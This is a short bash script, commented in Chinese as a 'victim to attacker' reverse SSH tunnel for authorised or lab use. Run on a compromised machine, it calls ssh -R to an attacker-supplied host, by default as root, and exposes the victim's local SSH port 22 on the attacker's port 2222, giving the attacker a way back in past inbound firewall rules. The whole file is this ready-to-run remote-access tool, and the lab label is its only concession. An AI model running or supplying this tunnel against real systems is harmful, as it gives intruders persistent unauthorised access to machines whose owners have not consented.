#!/usr/bin/env bash
# 受害机 → 攻击机：反向 SSH 隧道（授权/实验室）
# 用法：REMOTE_HOST=攻击机IP REMOTE_USER=u LOCAL_PORT=22 REMOTE_PORT=2222 bash ssh_reverse.sh
set -euo pipefail
: "${REMOTE_HOST:?}"
: "${REMOTE_USER:=root}"
: "${LOCAL_PORT:=22}"
: "${REMOTE_PORT:=2222}"
echo "[*] ssh -R ${REMOTE_PORT}:127.0.0.1:${LOCAL_PORT} ${REMOTE_USER}@${REMOTE_HOST}"
exec ssh -N -o ServerAliveInterval=30 -o ExitOnForwardFailure=yes \
  -R "${REMOTE_PORT}:127.0.0.1:${LOCAL_PORT}" \
  "${REMOTE_USER}@${REMOTE_HOST}"
